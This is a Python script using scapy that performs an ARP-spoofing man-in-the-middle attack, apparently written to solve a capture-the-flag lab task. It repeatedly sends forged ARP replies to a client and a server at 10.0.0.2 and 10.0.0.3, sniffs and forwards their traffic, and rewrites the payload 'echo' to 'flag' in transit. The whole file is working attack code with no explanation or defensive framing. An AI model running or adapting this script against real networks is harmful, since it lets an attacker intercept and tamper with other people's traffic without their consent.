#!/bin/python

from scapy.all import *
from socket import * 

import os
import sys
import time
import threading


SERVER_PORT = 31337
NET_INTER = conf.iface.name

ip_attack = get_if_addr(NET_INTER)
ip_client = "10.0.0.2"
ip_server = "10.0.0.3"

mac_attack = get_if_hwaddr(NET_INTER)
mac_client = getmacbyip(ip_client)
mac_server = getmacbyip(ip_server)

#os.system(f"ip addr add {ip_client} dev {NET_INTER}")
#os.system(f"ip addr add {ip_server} dev {NET_INTER}")

print(f"macs: \nattack= {mac_attack}\nclient= {mac_client}\nserver= {mac_server}\n")
time.sleep(1)

eth = Ether(src=mac_attack,dst="ff:ff:ff:ff:ff:ff")
arp_client = ARP(psrc=ip_server, op="is-at", hwsrc=mac_attack,
                 pdst=ip_client, hwdst=mac_client)
arp_server = ARP(psrc=ip_client, op="is-at", hwsrc=mac_attack,
                 pdst=ip_server, hwdst=mac_server)


def pkt_handle(pkt: Packet):
    if pkt[Ether].src == mac_attack or IP not in pkt:
        return # dont care

    if not (pkt[Ether].dst == mac_attack and \
           (pkt[IP].dst == ip_client or \
            pkt[IP].dst == ip_server)):
        return pkt.summary() 

    fwd_pkt = pkt.copy()
    fwd_pkt[Ether].src = mac_attack
    fwd_pkt[Ether].dst = mac_client if pkt[IP].dst == ip_client \
                                    else mac_server

    if fwd_pkt[IP].dst == ip_server and Raw in fwd_pkt and \
       fwd_pkt[Raw].load == b"echo":
        fwd_pkt[Raw].load = b"flag"

    del fwd_pkt[Ether].chksum
    del fwd_pkt[TCP].chksum
    del fwd_pkt[IP].chksum

    sendp(fwd_pkt, verbose=False)

    if len(sys.argv) != 1 and sys.argv[1] == '-v':
        return fwd_pkt.show(dump=True)
    else:
        return fwd_pkt.summary() + \
               f"\nEthernet MACs: {fwd_pkt[Ether].src} > {fwd_pkt[Ether].dst}" + \
               f"\nLoad: {fwd_pkt[Raw].load}\n" if Raw in fwd_pkt else ""



thd = threading.Thread(target=sniff, kwargs={"prn": pkt_handle, "store": 0})
thd.start()
time.sleep(1)

while True: 
    sendp(eth/arp_client, verbose=False)
    sendp(eth/arp_server, verbose=False)
    time.sleep(10) # 1..2 secs maybe is the best
